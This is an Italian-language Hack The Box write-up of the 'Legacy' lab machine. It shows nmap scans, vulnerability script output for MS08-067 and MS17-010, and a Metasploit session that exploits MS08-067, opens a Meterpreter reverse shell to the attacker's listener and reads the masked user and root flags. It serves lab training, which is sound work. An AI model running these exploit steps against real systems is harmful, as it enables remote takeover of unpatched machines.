---
layout: default
---

# Legacy (HTB)

Anche a questo giro come primo approccio lancio una scansione TCP SYN sulle porte con <span style="color:#46eac7">nmap</span>, dove cerco di farmi dare anche la versione dei servizi.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -sV 10.10.10.4      
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-24 10:26 EST
Nmap scan report for 10.10.10.4
Host is up (0.047s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.51 seconds
```
\
E come in <a href="{{ site.ctf.blue }}" target="_blank">Blue (HTB)</a> noto la <span style="color:#46eac7">porta 445</span> per il <span style="color:#46eac7">protocollo SMB</span>, in tandem con la 139 per il protocollo NetBIOS. Lancio quindi una nuova scansione utilizzando gli script <span style="color:#46eac7">smb-os-discovery</span> e <span style="color:#46eac7">smb-protocols</span> per ottenere qualche informazione in più.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p 445 --script smb-os-discovery,smb-protocols 10.10.10.4 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-24 10:27 EST
Nmap scan report for 10.10.10.4
Host is up (0.043s latency).

PORT    STATE SERVICE
445/tcp open  microsof0

Host script results:
| smb-protocols: 
|   dialects: 
|_    NT LM 0.12 (SMBv1) [dangerous, but default]
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-11-29T19:24:57+02:00

Nmap done: 1 IP address (1 host up) scanned in 10.41 seconds
```
\
Memore della macchina precedente provo a lanciare subito <span style="color:#46eac7">nmap</span> per verificare se è in grado di rilevare qualche vulnerabilità con lo script <span style="color:#46eac7">vuln</span>.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p 445 --script vuln 10.10.10.4                          
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-24 10:32 EST
Nmap scan report for 10.10.10.4
Host is up (0.043s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

Nmap done: 1 IP address (1 host up) scanned in 24.41 seconds
```
\
Individuata la <span style="color:#46eac7">CVE-2008-4250</span>, una ricerca su <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2008-4250" target="_blank">Mitre</a> mi redireziona al <a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067" target="_blank">Microsoft Security Bulletin MS08-067</a>. Cerco <span style="color:#46eac7">MS08-067</span> su <span style="color:#46eac7">Metasploit</span> per vedere se esite qualche exploit noto, lo trovo e lo lancio.

```bash
┌──(kali㉿kali)-[~]
└─$ msfconsole -q                       
msf6 > search ms08-067

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi

msf6 > use  0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/
                                       basics/using-metasploit.html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.14.12
LHOST => 10.10.14.12
msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.10.10.4:1032) at 2023-11-24 10:38:33 -0500

meterpreter > pwd
C:\WINDOWS\system32
```
\
Ora che sono dentro al sistema target procedo ad esplorarlo un po'. Trovare le flag di <span style="color:#46eac7">user</span> e <span style="color:#46eac7">root</span> è molto semplice.

```bash
meterpreter > cd \C:\\\

[--SNIP--]

meterpreter > ls
Listing: C:\Documents and Settings\john\Desktop
===============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-03-16 02:19:49 -0400  user.txt

meterpreter > cat user.txt 
********************************

[--SNIP--]

meterpreter > ls
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-03-16 02:18:50 -0400  root.txt

meterpreter > cat root.txt 
********************************
```